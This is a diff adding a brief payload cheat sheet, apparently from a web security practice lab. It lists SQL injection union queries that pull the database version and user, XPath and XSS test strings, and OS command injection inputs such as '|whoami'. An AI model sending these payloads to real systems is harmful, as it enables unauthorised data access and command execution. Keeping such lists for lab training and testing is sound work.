@@ -1,0 +1,26 @@
+SQL INJECTION
+'order by 8 #
+'union select 1,2,3,4,5,6,7 #
+' union select 1,@@version,3,database(),system_user(),6,7 #
+'union select * from caffaine;#
+XPATH INJECTION
+2
+' or '1'='1
+' or  ''='
+OS Command Injection
+<ip> | dir
+|whoami
+Unrestricted File Upload
+payload.html
+XSS Reflected
+hi
+<script>alert(5+5)</script>
+XSS Stored
+name-etc
+comment-hi
+ <h1 style="color:red">Halo.</h1>
+<h1>Halo</h1>
+DOM Based
+<img src="">onerror="alert(5)">
+<script>alert()</script>
+https://www.urlencoder.org/
